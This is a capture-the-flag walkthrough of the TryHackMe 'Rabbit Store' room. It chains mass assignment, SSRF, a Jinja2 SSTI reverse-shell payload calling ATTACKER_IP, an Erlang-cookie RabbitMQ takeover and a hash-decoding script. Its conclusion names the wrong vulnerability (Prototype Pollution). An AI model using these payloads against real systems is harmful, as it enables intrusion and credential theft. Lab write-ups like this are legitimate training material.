# Rabbit Store Walkthrough
<br/>

## Intro
Welcome to the Rabbit Store challenge, here is the link to the [room](https://tryhackme.com/room/rabbitstore) on TryHackMe.

In this challenge we are gonna practice with JWT tokens and other webapps vulns, reverse shell, privileges escalation and building scripts to reverse an hashing algorithm.

Whenever you feel ready press on "Start Machine" and connect via OpenVPN from your machine or use the AttackBox.

Let's begin!

<br/>
<br/>

## The Challenge
Let's add the domain to the hosts file:
```bash
echo "MACHINE_IP cloudsite.thm" | sudo tee -a /etc/hosts
```

nmap scan:
```bash
nmap -sV -sC cloudite.thm
```

We can see 2 open ports:
```
# NMAP SCAN
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
```

Open the website in your browser: `http://cloudsite.thm`

While fuzzing for hidden directories i got:
```bash
gobuster dir -u http://cloudsite.thm -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 64 --exclude-length 318
```

Clicking on the login button we land on a new a subdomain: `storage.cloudsite.thm`, so we add it to the hosts file, near the previous entry.
Now we can reload the page, here since we do not have an accound we click on `signup` and create a new one, then we log in.

Upon login we see this message:
```
Sorry, this service is only for internal users working within the organization and our clients. If you are one of our clients, please ask the administrator to activate your subscription.
```

If we check the cookies we can find a JWT token, let's analyze it:
```bash
jwt_tool "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJzdWJzY3JpcHRpb24iOiJpbmFjdGl2ZSIsImlhdCI6MTc0NjEzMDk3OCwiZXhwIjoxNzQ2MTM0NTc4fQ.AMsgGHHlmbtZhk7JISPzutRGPLeXlLNtAeY2TfdpGhE"
```

We can see in the token payload that the status is set as inactive, that's the reason of the message:
```
subscription = "inactive"
```

Maybe we can forge and submit a new token with that value set to "active". But at the moment we miss the secret needed to create a new one.
Let's try to signup again with a new accound and submit the subscrption as payload together with the mail and password.

```json
{
	"email":"test2@test.com",
	"password":"test",
	"subscription": "active"
}
```

Login with this new accound and we land on the dashboard, it worked!

On the dashboard there are forms where we can upload files either selecting one or by choosing an URL, when we click upload we then get the message that it hash been uploaded to:
```
/api/uploads/REDACTED
```

Navigating to theat specific URL will prompt us to download the file we had previously uploaded.
The intersting thing is that we discoverd an API, let's see if we get any endpoints:
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u http://storage.cloudsite.thm/api/FUZZ -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3QyQHRlc3QuY29tIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzQ2MTMxNjQ1LCJleHAiOjE3NDYxMzUyNDV9.XBwpwPCTsdZF31od1hGikhyE0JN8ZAwuTuG-ypZU_mA" 
```

It finds the `/api/docs` endpoint which could reveal us information on how the  API works, but navigating to it we get a forbidden access error.

Also checking the page sorce code, at the end, we can see many JS files being called, BUT one grab my attention: `/assets/js/custom_script_active.js`:
```js
document.getElementById('logoutButton').addEventListener('click', async () => {
    const response = await fetch('/api/logout', {
        method: 'POST'
    });

    if (response.ok) {
        window.location.href = 'http://storage.cloudsite.thm/';
    } else {
        console.error('Logout failed');
    }
});


// Function to handle response data and display messages in divs
function handleResponse(data, targetDiv) {
    console.log(data); // Log the response data
    // Update the target div with the message received in the response
    document.querySelector(targetDiv).innerHTML = 
        `<p>Success: ${data.message}</p><p>File path: ${data.path}</p>`;
}

// Function to handle errors and display error messages in divs
function handleError(targetDiv) {
    console.error("Error:", error);
    // Display an error message in the target div
    document.querySelector(targetDiv).innerHTML = 
        `<p style="color: red;">An error occurred while processing the request.</p>`;
}

// Event listener for file upload form submission
document.getElementById("uploadForm").addEventListener("submit", function(event) {
    event.preventDefault(); // Prevent default form submission

    const formData = new FormData(); // Create FormData object
    formData.append("file", document.getElementById("fileInput").files[0]); // Append file to FormData

    // Use fetch to send FormData directly
    fetch("/api/upload", {
        method: "POST",
        body: formData // Send FormData object directly
    })
    .then(response => response.json())
    .then(data => handleResponse(data, ".uploadLocalhost")) // Call handleResponse with target div
    .catch(() => handleError(".uploadLocalhost")); // Call handleError with target div
});

// Event listener for URL form submission
document.getElementById("urlForm").addEventListener("submit", function(event) {
    event.preventDefault(); // Prevent default form submission

    const url = document.getElementById("urlInput").value;

    // Use fetch to send URL as JSON
    fetch("/api/store-url", {
        method: "POST",
        body: JSON.stringify({ url: url }), // Serialize URL as JSON
        headers: {
            "Content-Type": "application/json"
        }
    })
    .then(response => response.json())
    .then(data => handleResponse(data, ".uploadUrl")) // Call handleResponse with target div
    .catch(() => handleError(".uploadUrl")); // Call handleError with target div
});

// Fetch files from the /api/uploads endpoint
fetch('/api/uploads')
    .then(response => response.json())
    .then(files => {
        const fileContainer = document.getElementById('fileContainer');

        files.forEach(file => {
            // Create a div for each file
            const fileDiv = document.createElement('div');
            fileDiv.className = 'file-item';

            // Create an anchor element for the file link
            const fileLink = document.createElement('a');
            fileLink.href = `/api/uploads/${file}`;
            fileLink.textContent = file;

            // Append the link to the div
            fileDiv.appendChild(fileLink);

            // Append the div to the container
            fileContainer.appendChild(fileDiv);
        });
    })
    .catch(error => {
        console.error('Error fetching files:', error);
        const fileContainer = document.getElementById('fileContainer');
        fileContainer.innerHTML = '<p>Error loading files. Please try again later.</p>';
    });
```

Many tings going on here, from handling the logount, to uploads to display of messages. The code contains already a good exaplaination of every part.

One last thing and we should have enough info to proceede, via the *Wappalizer* extension we can see that the web-app uses the Express Framework.

Time to test the URL uploads through Burp's Proxy, my objective here is to find a way to read the API documentation.
My idea is to test for an SSRF vulnerability, we upload the docs to the /uploads/ID and then we navigate to it and download.

Setting the URL to `http://localhost/api/docs` will save a file, but unfortunately when we donwlod it it cointans the same error message we were seeing before.
Another thing to try is, since Express runs on port 3000 by default is to check if adding the port to the URL makes any changes: `http://localhost:3000/api/docs`.

This last attempt worked and the downloaded file conains the following info:
```
Endpoints Perfectly Completed

POST Requests:
/api/register - For registering user
/api/login - For loggin in the user
/api/upload - For uploading files
/api/store-url - For uploadion files via url
/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.

GET Requests:
/api/uploads/filename - To view the uploaded files
/dashboard/inactive - Dashboard for inactive user
/dashboard/active - Dashboard for active user

Note: All requests to this endpoint are sent in JSON format.
```

We have already seen most of the endpoints through our journey, but `/api/fetch_messeges_from_chatbot` looks intersting to look for, also is under development so it might not enforce all the restrictions.

Let's check how we can interact with it:
```bash
curl -X OPTIONS  http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3QyQHRlc3QuY29tIiwic3Vic2NyaXB0aW9uIjoiYWN0aXZlIiwiaWF0IjoxNzQ2MTMxNjQ1LCJleHAiOjE3NDYxMzUyNDV9.XBwpwPCTsdZF31od1hGikhyE0JN8ZAwuTuG-ypZU_mA"

GET, HEAD, POST
```

Sending a normal post request gives us an error 500, let's try to specify the data type as the note suggests with the `Content-Type: application/json;charset=UTF-8` header and sending an empty json `{}` data.

We get an interesting error: `username parameter is required`, we can try to supply a username in the body payload:
```json
{
	"username":"admin"
}
```

This will result in a response containing:
```
Sorry, admin, our chatbot server is currently under development.
```

Our user-name gets put inside the string, can the usage of our unfiltered input lead to any new vulnerability?
I have tested with this payload:
```json
{
	"username":"#{{7*7}}"
}
```

And the response executed it printing the number 49, this confirm an SSTI (Server Side Template Injection) vulnerability.

Great, now we have to create a payload to get code execution, since before i saw Node.js being used in wappalyzer i crafted this:
```js
#{{root.process.mainModule.require('child_process'.spawnSync('ls').stdout}}
```

Turned out it was not Pug as i tough but the response told me it is jinja2 (Python) with a bunch of other info:
```
     var CONSOLE_MODE = false,
          EVALEX = true,
          EVALEX_TRUSTED = false,
          SECRET = "6RClTP6swWAaaJSJzz2I";
```

Along with an user name: `/home/azrael`.

I think i was actually lucky to made that error lol.
Anyway let's now try to make one for Jinja2:
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

This one succesfully printed the output of the `id` command, we now have achieved RCE.
Let's prepare a listener on our machine:
```bash
nc -lvnp 1234
```

Now let's send a reverse shell:
```json
{
"username":"{{request.application.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER_IP 1234 >/tmp/f').read()}}"
}
```

This will give us a shell as the user azreal.

Let's improve our shell with (i made a guide [here](https://github.com/Maat-Cyber/Maat-Cyber-World/blob/main/Tips-%26-Resources/Reverse_Shell-Upgrade.md) on this topic)

We can finally get the user flag:
```bash
cat ~/user.txt
```

--> REDACTED

<br/>

### Privilege Escalation
Now is time to enumerate the machine for potential route for privilege escalation.
From my machine i transfered the `linpeas.sh` script on the target using a python HTTP server:
```bash
python3 -m http.server
```

On target:
```bash
wget http://ATTACKER_IP:8000/linpeas.sh
```

Now let's make the file executable and run it:
```bash
chmod +x linpeas.sh
```
```bash
./linpeas.sh > linpeas_report
```

For better readability i then transferred the report on my machine:
```bash
nc -lvnp 4444 > linpeas_report
```

On target:
```bash
nc -nv  4444 < linpeas_report
```

It seems we can access some erlang cookies:
```bash
cat /var/lib/rabbitmq/.erlang
cookie: KylOMwKdsXpLQubC
```

We can try to use it to connect to the node from our machine:
```bash
sudo rabbitmqctl --node rabbit@forge --erlang-cookie 'KylOMwKdsXpLQubC' status
```


> [!NOTE] Note
> You might need to install the tool first with `sudo pacman -S rabbitmq` or for debian `sudo apt install rabbitmq-server`.
> Then add `forge` to the your hosts file.

Check users:
```bash
sudo rabbitmqctl --node rabbit@forge --erlang-cookie 'KylOMwKdsXpLQubC' list_users
```

This result in the message:
```
The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.
```

So we need to find the RabbitMQ root user's password:
```bash
sudo rabbitmqctl --node rabbit@forge --erlang-cookie 'KylOMwKdsXpLQubC' export_definitions creds.json
```

Inside we find the password hash: `49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF`
Now we need to crack that hash to find the password.

I had no clue about this app so i searched online and found the [Official Documentation](https://www.rabbitmq.com/docs/passwords) at the end of this page is exaplained the algorithm used for hashing, we have to revert it.
I made a script which illustrates step-by step what we are doing:
```bash
#!/bin/bash

# Script to decode RabbitMQ password
echo -e "Input the hash here:\n"
read HASH

# Decode from base64
B64_DECODED=$(echo "$HASH" | base64 -d)

# Decodes the Base64 string into raw binary data (hex format)
DECODED_FINAL=$(echo "$B64_DECODED" | xxd -p -c 1000) # -c 1000 ensure the output is in a single line

# Remove the first 8 characters (4 bytes in hex)
result="${DECODED_FINAL:8}"

# Print the root password
echo -e "\n The root password is:  $result"
```

Now on the target:
```bash
su root
```
```bash
cat /root/root.txt
```

<br/>
<br/>

## Conclusion
Congratulations you have successfully exploited the Prototype Pollution vulnearbility to gain an initial foothold and reversed the hashing algorithm of the application.

I hope you had fun doing the challenge and following along!

Catch you in the next CTF 😃 
